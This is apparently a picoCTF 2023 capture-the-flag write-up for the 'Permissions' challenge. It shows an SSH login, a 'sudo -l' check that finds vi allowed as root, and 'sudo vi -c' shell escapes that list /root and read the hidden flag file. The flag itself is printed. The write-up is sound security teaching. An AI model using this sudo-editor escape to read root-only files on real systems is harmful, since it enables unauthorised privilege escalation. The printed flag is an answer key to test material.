# Permissions

### Tags : `#picoctf2023` `#generalskills` `#vim`

> 100 points

#### AUTHOR : GEOFFREY NJOGU

## Description

Can you read files in the root file?

Additional details will be available after launching your challenge instance.

## Solution

Launch the challenge instance.

Use the `ssh` command to connect to the challenge instance.

``` bash
$ ssh <username>@<hostname-instance> -p <port>

<username>@<hostname-instance>'s password: <password>

Welcome to Ubuntu <version> LTS (GNU/Linux <arch>)
[...]

<username>@<instace>$
```


``` bash
$ sudo -l
[sudo] password for picoplayer: <password>
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
```

``` bash
 sudo vi -c '! ls -al /root'

total 12
drwx------ 1 root root   23 Mar 16 02:29 .
drwxr-xr-x 1 root root   51 Jun 26 09:32 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Mar 16 02:29 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile

Press ENTER or type command to continue
[4]+  Stopped                 sudo vi -c '! ls -al /root'
picoplayer@challenge:~$ sudo vi -c '! cat /root/.flag.txt'

picoCTF{uS1ng_v1m_3dit0r_3dd6dcf4}

Press ENTER or type command to continue

```